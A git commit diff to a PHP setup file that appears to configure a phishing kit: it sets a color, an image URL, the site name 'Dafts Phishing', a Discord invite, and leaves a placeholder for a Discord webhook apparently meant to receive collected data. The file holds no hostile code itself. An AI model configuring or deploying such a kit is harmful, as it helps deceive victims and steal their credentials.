e5017c7df1aa99bb80df0fba874962513cb3a726
Daft <88007632+OnlyDaft@users.noreply.github.com>
2024-04-28 21:33:23 -0400

    Update setup.php

--- setup.php
+++ setup.php
@@ -1,7 +1,7 @@
 <?php
-$color = 'Your color'; // any hexdec color
-$image = 'Your Image'; // get any image (must be url)
-$name = 'Your Name'; // name for your site
-$discord = 'https://discord.gg/Yourinvite'; // discord invite, must be starting with https://
+$color = '3EEEC4'; // any hexdec color
+$image = 'https://cdn.discordapp.com/attachments/1231704882893946943/1234306418270666772/latest.png?ex=663040ee&is=662eef6e&hm=9ccc7ccea9844b8ea8f0c2ec74c484f2fec552696059f389dbe983a17f6d4a0b&'; // get any image (must be url)
+$name = 'Dafts Phishing'; // name for your site
+$discord = 'https://discord.gg/G4KGhJcc'; // discord invite, must be starting with https://
 $admin = 'your webhook'; // discord webhook, make sure you put in the right webhook
 ?>
